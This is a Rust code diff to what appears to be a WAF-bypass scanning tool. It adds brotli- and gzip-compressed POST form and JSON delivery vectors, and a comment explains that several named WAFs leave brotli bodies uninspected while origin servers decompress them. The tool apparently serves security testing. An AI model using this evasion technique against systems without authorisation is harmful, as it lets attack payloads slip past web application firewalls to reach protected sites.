@@ -24,6 +24,7 @@ use std::process::ExitCode;
 use std::time::{Duration, Instant};
 
 // waf_detect now consumed via `crate::scan::detect_phase`.
+use wafrift_encoding::compression::{self, Algorithm as CompressionAlgo};
 use wafrift_encoding::encoding::{self, Strategy};
 use wafrift_encoding::header as header_obfuscation;
 use wafrift_encoding::tamper::TamperRegistry;
@@ -1373,10 +1374,24 @@ pub(crate) async fn run_scan(
     // Step 5: Multi-vector — re-fire top bypass payloads through alternative delivery vectors.
     // WAFs often have weaker inspection for POST body, JSON body, cookies, etc.
     if !bypass_variants.is_empty() && !cancel.is_cancelled() {
+        // Vectors include compression-confusion variants — wrapping
+        // the body in Content-Encoding: br / gzip. Brotli is the
+        // headline WAF gap: ModSec / Cloudflare / AWS WAF parse the
+        // request body as raw bytes when the encoding is `br`
+        // (no brotli decompressor in the inspection pipeline), so
+        // the payload sails through unchecked while the origin
+        // (nginx / Apache / IIS) decompresses normally. Gzip is the
+        // control variant — most WAFs DO decompress gzip, so a
+        // gzip-only bypass is a separate (gzip-handling) bug worth
+        // surfacing on its own.
         let vectors: Vec<(&str, &str)> = vec![
             ("POST-form", "application/x-www-form-urlencoded"),
             ("POST-json", "application/json"),
             ("POST-multipart", "multipart/form-data"),
+            ("POST-form-br", "application/x-www-form-urlencoded"),
+            ("POST-json-br", "application/json"),
+            ("POST-form-gz", "application/x-www-form-urlencoded"),
+            ("POST-json-gz", "application/json"),
             ("cookie", ""),
             ("hpp", ""),
             ("x-forwarded-for", ""),
@@ -1427,6 +1442,56 @@ pub(crate) async fn run_scan(
                             .body(body)
                             .send()
                             .await
+                    }
+                    "POST-form-br" | "POST-form-gz" => {
+                        let algo = if *vector_name == "POST-form-br" {
+                            CompressionAlgo::Brotli
+                        } else {
+                            CompressionAlgo::Gzip
+                        };
+                        let raw = format!("{}={}", args.param, urlencoding::encode(payload));
+                        match compression::compress(raw.as_bytes(), algo) {
+                            Ok(blob) => http
+                                .post(target)
+                                .header("Content-Type", *content_type)
+                                .header("Content-Encoding", blob.content_encoding)
+                                .body(blob.body)
+                                .send()
+                                .await,
+                            Err(e) => {
+                                // Compression error should be impossible
+                                // for in-memory operations; surface to
+                                // operator and skip the variant rather
+                                // than silently dropping it.
+                                eprintln!(
+                                    "[wafrift scan] compression {algo:?} skipped: {e}",
+                                );
+                                continue;
+                            }
+                        }
+                    }
+                    "POST-json-br" | "POST-json-gz" => {
+                        let algo = if *vector_name == "POST-json-br" {
+                            CompressionAlgo::Brotli
+                        } else {
+                            CompressionAlgo::Gzip
+                        };
+                        let raw = serde_json::json!({ &args.param: payload }).to_string();
+                        match compression::compress(raw.as_bytes(), algo) {
+                            Ok(blob) => http
+                                .post(target)
+                                .header("Content-Type", *content_type)
+                                .header("Content-Encoding", blob.content_encoding)
+                                .body(blob.body)
+                                .send()
+                                .await,
+                            Err(e) => {
+                                eprintln!(
+                                    "[wafrift scan] compression {algo:?} skipped: {e}",
+                                );
+                                continue;
+                            }
+                        }
                     }
                     "cookie" => {
                         http.get(target)
